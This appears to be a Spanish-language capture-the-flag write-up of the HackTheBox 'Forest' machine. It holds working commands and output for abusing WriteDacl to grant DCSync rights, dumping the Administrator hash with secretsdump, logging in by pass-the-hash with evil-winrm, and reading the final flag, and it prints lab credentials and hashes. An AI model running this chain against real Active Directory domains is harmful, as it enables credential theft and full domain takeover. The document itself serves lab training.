
Si Evil-WinRM no acepta la ruta con tools/, usa:

upload PowerView.ps1

después de copiar PowerView.ps1 al directorio base de Forest en Parrot.

Cargar PowerView en la sesión remota:

. .\PowerView.ps1

Crear una credencial PowerShell para el usuario controlado:

$pass = ConvertTo-SecureString 'R4mForest!26' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\r4mforest', $pass)

Conceder permisos DCSync a r4mforest:

Add-ObjectACL -PrincipalIdentity r4mforest -Credential $cred -Rights DCSync

Si el comando no devuelve error, se considera aplicado.

Después, desde Parrot, fuera de Evil-WinRM, validar DCSync:

cd /home/r4mon/pentest/targets/HTB/easy/FOREST
impacket-secretsdump htb.local/r4mforest:'R4mForest!26'@10.129.95.210 -outputfile loot/ad/secretsdump_r4mforest
Comprobaciones

PowerView debe cargarse sin errores visibles.

Add-ObjectACL no debe devolver error.

secretsdump debe empezar a mostrar líneas de credenciales del dominio.

La señal crítica esperada será ver entradas como:

htb.local\Administrator:500:...
krbtgt:502:...

Si aparece el hash NTLM de Administrator, la fase DCSync queda confirmada.

Explicación didáctica

La cuenta r4mforest no es administradora del dominio.

Su valor viene de la ruta de permisos:

r4mforest ∈ Exchange Windows Permissions
Exchange Windows Permissions -- WriteDacl --> HTB.LOCAL

WriteDacl sobre el dominio permite modificar la lista de control de acceso del propio dominio.

Al conceder permisos DCSync, se otorgan derechos de replicación suficientes para solicitar secretos del directorio como si se participara en procesos legítimos de replicación.

El hallazgo dominante actual es:

r4mforest dentro de Exchange Windows Permissions

La rama principal activa es:

AD / abuso de ACLs / DCSync

El siguiente paso único es cargar PowerView y ejecutar Add-ObjectACL para conceder DCSync a r4mforest.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
ls -lah tools/PowerView.ps1
lsd: tools/PowerView.ps1: No such file or directory (os error 2).

## Conclusiones

PowerView.ps1 no está en la carpeta tools.

Actualmente solo existe:

tools/SharpHound.exe

No hay que bloquearse por esto. En Forest se puede continuar por dos vías:

Opción A: buscar PowerView.ps1 en Parrot y copiarlo a tools.
Opción B: usar impacket-dacledit desde Parrot y evitar PowerView.

La opción más limpia ahora es B: usar impacket-dacledit, porque ya se ha confirmado que r4mforest pertenece a Exchange Windows Permissions y ese grupo tiene WriteDacl sobre HTB.LOCAL.

Objetivo

Conceder permisos DCSync a r4mforest sin depender de PowerView.

Hechos verificados

La carpeta actual de herramientas contiene solo:

SharpHound.exe

No existe:

tools/PowerView.ps1

La cuenta controlada ya existe:

r4mforest

La cuenta pertenece a:

Exchange Windows Permissions
Remote Management Users
Domain Users

Exchange Windows Permissions tiene WriteDacl sobre el dominio HTB.LOCAL.

Suposiciones

La herramienta impacket-dacledit puede estar disponible en Parrot como parte de Impacket.

Si no está instalada, se buscará alternativa después.

Método

Primero se comprueba si existe impacket-dacledit.

Si existe, se usa desde Parrot para modificar la ACL del dominio y conceder permisos DCSync a r4mforest.

Después se valida con secretsdump.

Respuesta

No hace falta seguir buscando PowerView ahora. Probamos primero con Impacket desde Parrot.

Comandos

Ejecutar desde Parrot, no dentro de Evil-WinRM:

cd /home/r4mon/pentest/targets/HTB/easy/FOREST

Comprobar si existe impacket-dacledit:

which impacket-dacledit

Si devuelve una ruta, ejecutar:

impacket-dacledit \
  -action write \
  -rights DCSync \
  -principal r4mforest \
  -target-dn 'DC=htb,DC=local' \
  'htb.local/r4mforest:R4mForest!26' \
  -dc-ip 10.129.95.210

Este comando usa la cuenta r4mforest, ya miembro de Exchange Windows Permissions, para modificar la ACL del dominio y concederse permisos de replicación.

Después, validar DCSync de forma contenida contra el usuario Administrator:

impacket-secretsdump \
  'htb.local/r4mforest:R4mForest!26@10.129.95.210' \
  -just-dc-user Administrator \
  -outputfile loot/ad/secretsdump_administrator
Comprobaciones

impacket-dacledit debe terminar sin error crítico.

secretsdump debe mostrar una línea parecida a:

htb.local\Administrator:500:...

Si aparece el hash NTLM de Administrator, DCSync queda confirmado.

Explicación didáctica

PowerView y impacket-dacledit pueden servir para el mismo objetivo en esta fase: modificar la ACL del dominio.

La diferencia práctica es:

PowerView        se ejecuta dentro de Windows por WinRM
impacket-dacledit se ejecuta desde Parrot contra LDAP/AD

Como PowerView no está disponible localmente, usar Impacket evita descargar herramientas nuevas y mantiene el flujo más limpio.

El hallazgo dominante sigue siendo:

r4mforest pertenece a Exchange Windows Permissions

La rama principal activa es:

AD / abuso de ACLs / DCSync

El siguiente paso único es comprobar si impacket-dacledit está disponible.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
❯ which impacket-dacledit
impacket-dacledit: aliased to dacledit.py
❯ impacket-dacledit \
  -action write \
  -rights DCSync \
  -principal r4mforest \
  -target-dn 'DC=htb,DC=local' \
  'htb.local/r4mforest:R4mForest!26' \
  -dc-ip 10.129.95.210
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20260429-175029.bak
[*] DACL modified successfully!
❯ impacket-secretsdump \
  'htb.local/r4mforest:R4mForest!26@10.129.95.210' \
  -just-dc-user Administrator \
  -outputfile loot/ad/secretsdump_administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
[*] Cleaning up...

## Conclusiones

La fase DCSync queda confirmada.

impacket-dacledit modificó correctamente la DACL del dominio y concedió permisos de replicación a la cuenta controlada r4mforest.

Después, impacket-secretsdump pudo extraer correctamente el hash NTLM de Administrator mediante DRSUAPI.

El hallazgo dominante pasa a ser:

hash NTLM de Administrator obtenido por DCSync

La máquina queda técnicamente comprometida a nivel de dominio.

Objetivo

Validar acceso administrativo usando el hash NTLM de Administrator y obtener la flag final desde el perfil del administrador.

Hechos verificados

La modificación de ACL funcionó correctamente:

DACL modified successfully!

La DACL original quedó respaldada en:

dacledit-20260429-175029.bak

La cuenta usada para DCSync fue:

htb.local\r4mforest

secretsdump extrajo correctamente credenciales del dominio mediante:

DRSUAPI

Se obtuvo el hash NTLM de Administrator:

32693b11e6aa90eb43d32c72a07ceea6

También se obtuvieron claves Kerberos AES y DES de Administrator.

Suposiciones

El hash NTLM de Administrator puede usarse para autenticación pass-the-hash.

WinRM sigue disponible en el puerto 5985/tcp.

La vía más limpia para confirmar acceso administrativo es Evil-WinRM con hash NTLM, sin necesidad de conocer la contraseña en claro.

Método

Primero se valida el hash NTLM contra WinRM usando pass-the-hash.

Después se abre sesión como Administrator.

Finalmente se confirma el contexto real con whoami, hostname y se lee root.txt.

Respuesta

El siguiente paso único es entrar por Evil-WinRM como Administrator usando el hash NTLM obtenido.

No hace falta crackear el hash. En Windows, el NTLM puede reutilizarse directamente en ciertos protocolos compatibles mediante pass-the-hash.

Comandos

Desde Parrot:

cd /home/r4mon/pentest/targets/HTB/easy/FOREST

Entrar como Administrator usando pass-the-hash:

evil-winrm -i 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'

Dentro de Evil-WinRM, confirmar contexto:

whoami
hostname
pwd

La salida esperada para whoami debería ser:

htb\administrator

Leer la flag final:

dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\root.txt
Comprobaciones

Debe abrirse una sesión Evil-WinRM como Administrator.

Debe confirmarse el usuario efectivo:

htb\administrator

Debe existir:

C:\Users\Administrator\Desktop\root.txt

La flag debe comprobarse después en HTB.

Explicación didáctica

La fase DCSync no consiste en “romper” la contraseña del administrador. Consiste en abusar de permisos de replicación del dominio para solicitar secretos del directorio.

La cadena final queda así:

svc-alfresco con ASREPRoasting
-> contraseña s3rvice
-> WinRM como svc-alfresco
-> Account Operators
-> creación de r4mforest
-> r4mforest añadido a Exchange Windows Permissions
-> Exchange Windows Permissions con WriteDacl sobre HTB.LOCAL
-> concesión de DCSync a r4mforest
-> secretsdump
-> hash NTLM de Administrator
-> pass-the-hash
-> acceso administrativo

El hallazgo dominante actual es:

hash NTLM válido de Administrator

La rama principal activa es:

validación de compromiso administrativo

El siguiente paso único es entrar por Evil-WinRM con el hash de Administrator.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
❯ evil-winrm -i 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
FOREST
*Evil-WinRM* PS C:\Users\Administrator\Documents> pwd

Path
----
C:\Users\Administrator\Documents


*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users\Administrator\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/29/2026   4:28 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
2a7cbb6f92926190213605fa2ba841d3

## Conclusiones

La máquina Forest queda resuelta.

El acceso administrativo se ha confirmado mediante pass-the-hash con el hash NTLM de Administrator.

La sesión WinRM se abrió correctamente como:

htb\administrator

La flag final root.txt se encontró en:

C:\Users\Administrator\Desktop\root.txt

El hallazgo dominante final es:

compromiso completo del dominio mediante DCSync y uso del hash NTLM de Administrator
Objetivo

Confirmar el compromiso administrativo de Forest y cerrar la cadena técnica de explotación con evidencia suficiente para reconstruir después el MD final didáctico.

Hechos verificados

La autenticación como Administrator mediante hash NTLM fue correcta.

El usuario efectivo confirmado fue:

htb\administrator

El host confirmado fue:

FOREST

El directorio inicial de la sesión administrativa fue:

C:\Users\Administrator\Documents

El archivo root.txt existe en el escritorio del administrador.

La flag final fue leída correctamente desde:

C:\Users\Administrator\Desktop\root.txt
Suposiciones

La máquina queda completamente comprometida a nivel de dominio.

La cadena de explotación ya dispone de evidencia suficiente para redactar el writeup técnico final.

La fase pendiente ya no es explotación, sino cierre documental y, si se desea, limpieza del laboratorio.

Método

La validación final se hizo en tres pasos:

usar el hash NTLM de Administrator obtenido por DCSync;
abrir sesión WinRM mediante pass-the-hash;
confirmar contexto real y leer la flag final.

Esta fase valida que el hash obtenido no era solo un dato extraído, sino una credencial reutilizable para acceso administrativo remoto.

Respuesta

Cadena final confirmada:

LDAP anonymous bind
-> enumeración de usuarios y objetos del dominio
-> identificación de svc-alfresco
-> ASREPRoasting
-> crackeo offline del hash AS-REP
-> contraseña s3rvice
-> acceso WinRM como svc-alfresco
-> pertenencia a Account Operators
-> creación de usuario r4mforest
-> inclusión en Exchange Windows Permissions
-> abuso de WriteDacl sobre HTB.LOCAL
-> concesión de permisos DCSync
-> secretsdump
-> hash NTLM de Administrator
-> pass-the-hash
-> WinRM como Administrator
-> root.txt

La máquina queda lista para cierre técnico.

Comandos

Comando usado para entrar como administrador mediante pass-the-hash:

evil-winrm -i 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'

Comandos de verificación ejecutados dentro de la sesión administrativa:

whoami
hostname
pwd

Comandos usados para localizar y leer la flag final:

dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\root.txt
Comprobaciones

La sesión administrativa devuelve:

htb\administrator

El host devuelve:

FOREST

El archivo existe:

C:\Users\Administrator\Desktop\root.txt

La flag final fue obtenida correctamente.

Explicación didáctica

El punto clave de la fase final es que no fue necesario conocer la contraseña en claro de Administrator.

Al obtener el hash NTLM mediante DCSync, fue posible reutilizarlo directamente contra WinRM mediante pass-the-hash.

Esto demuestra el impacto real de conceder permisos DCSync a una cuenta controlada: permite extraer secretos del dominio y convertirlos en acceso administrativo efectivo.

La explotación de Forest no termina en la obtención de una shell como svc-alfresco; esa cuenta solo es el punto de entrada. El compromiso completo se consigue al encadenar permisos de Active Directory hasta obtener capacidad de replicación del dominio.

La rama principal queda cerrada como:

AD / Kerberos / ACL abuse / DCSync / pass-the-hash



````
